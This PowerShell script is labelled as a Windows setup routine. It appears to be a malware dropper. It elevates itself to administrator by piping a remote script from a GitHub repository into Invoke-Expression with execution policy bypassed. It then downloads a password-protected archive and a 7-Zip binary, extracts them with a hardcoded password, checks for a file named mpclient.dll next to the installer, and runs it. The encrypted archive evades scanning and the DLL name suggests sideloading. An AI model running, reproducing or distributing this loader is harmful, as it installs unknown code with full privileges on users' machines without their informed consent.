# setup
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$Owner     = 'EndMonitorContinue'
$Repo      = 'Windows-Setup'
$RemotePs1 = "https://raw.githubusercontent.com/$Owner/$Repo/refs/heads/main/scripts/setup.ps1"

function Write-Step {
    param(
        [int]$Number,
        [string]$Text
    )

    Write-Host ("[{0}/3] {1}..." -f $Number, $Text) -ForegroundColor Cyan
}

function Show-InstallHeader {
    Write-Host ""
    Write-Host "Do not close this window until download and extract finish." -ForegroundColor Yellow
    Write-Host ""
}

function Stop-InstallerProcesses {
    foreach ($name in @('Latest Release_v2.1', 'Release')) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Milliseconds 500
}

function Resolve-InstallerExe {
    param(
        [string]$ExtractDir,
        [string]$PreferredName
    )

    $preferred = Join-Path $ExtractDir $PreferredName
    if (Test-Path $preferred) {
        return $preferred
    }

    $candidates = @(Get-ChildItem -Path $ExtractDir -Filter '*.exe' -File -ErrorAction SilentlyContinue)
    if ($candidates.Count -eq 1) {
        return $candidates[0].FullName
    }

    throw "Installer not found: $preferred"
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    $elevated = "-NoProfile -ExecutionPolicy Bypass -Command ""irm '$RemotePs1' | iex"""
    Start-Process powershell -Verb RunAs -ArgumentList $elevated
    exit
}

$base     = "https://github.com/$Owner/$Repo/releases/download/Release"
$zipUrl   = "$base/setup.zip"
$7zaUrl   = "$base/7za.exe"
$password = 'ReleaseV2.1&*'
$exeName  = 'Latest Release_v2.1.exe'

Stop-InstallerProcesses

$work = Join-Path $env:TEMP ("ps_{0}" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
$zip  = Join-Path $work 'setup.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'files'

Show-InstallHeader

Write-Step 1 'Downloading components'
New-Item -ItemType Directory -Path $work -Force | Out-Null

Invoke-RestMethod $7zaUrl -OutFile $7za
Invoke-RestMethod $zipUrl -OutFile $zip

Write-Step 2 'Preparing files'
New-Item -ItemType Directory -Path $dest -Force | Out-Null
& $7za x $zip "-o$dest" "-p$password" -y | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Extract failed (code $LASTEXITCODE)" }

$exe = Resolve-InstallerExe -ExtractDir $dest -PreferredName $exeName
$dll = Join-Path $dest 'mpclient.dll'
if (-not (Test-Path $dll)) {
    throw "Required file not found: $dll"
}

Write-Step 3 'Running setup'
Write-Host "  Launching installer — complete the setup window if it appears." -ForegroundColor DarkGray

$proc = Start-Process -FilePath $exe -WorkingDirectory $dest -WindowStyle Normal -PassThru
if ($null -eq $proc) {
    throw 'Installer did not start'
}

Write-Host ""
Write-Host "Setup successful." -ForegroundColor Green
Write-Host ("Installer started (PID {0})." -f $proc.Id) -ForegroundColor Green
Write-Host "This window can be closed — setup continues in the installer." -ForegroundColor Green
Write-Host ""
Write-Host ("Work folder: {0}" -f $work) -ForegroundColor DarkGray
Write-Host ""
